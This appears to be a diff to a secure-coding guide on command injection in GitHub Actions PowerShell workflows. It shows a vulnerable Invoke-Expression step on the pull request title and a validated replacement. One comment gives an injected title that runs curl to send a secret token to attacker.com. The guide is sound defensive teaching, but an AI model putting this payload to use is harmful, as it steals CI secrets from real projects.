@@ -47,25 +47,27 @@ jobs:
 
 ### Secure Version
 
-```yaml
-name: Process PR Title Safely
-on:
-  pull_request:
-jobs:
-  process:
-    runs-on: windows-latest
-    steps:
-      - name: Process input
-        env:
-          PR_TITLE: ${{ github.event.pull_request.title }}
-        shell: powershell
-        run: |
-          # Validate input
-          if ($env:PR_TITLE -notmatch '^[a-zA-Z0-9\s-]+$') {
-            Write-Error "Invalid input"
-            exit 1
-          }
-          Write-Host $env:PR_TITLE  # Safe - no injection
+```diff
+ name: Process PR Title Safely
+ on:
+   pull_request:
+ jobs:
+   process:
+     runs-on: windows-latest
+     steps:
+       - name: Process input
++        env:
++          PR_TITLE: ${{ github.event.pull_request.title }}
+         shell: powershell
+         run: |
++          # Validate input
++          if ($env:PR_TITLE -notmatch '^[a-zA-Z0-9\s-]+$') {
++            Write-Error "Invalid input"
++            exit 1
++          }
+-          Invoke-Expression "${{ github.event.pull_request.title }}"
+-          # Attacker can inject: "; curl attacker.com/steal?token=$SECRET; #"
++          Write-Host $env:PR_TITLE  # Safe - no injection
 ```
 
 ## Impact
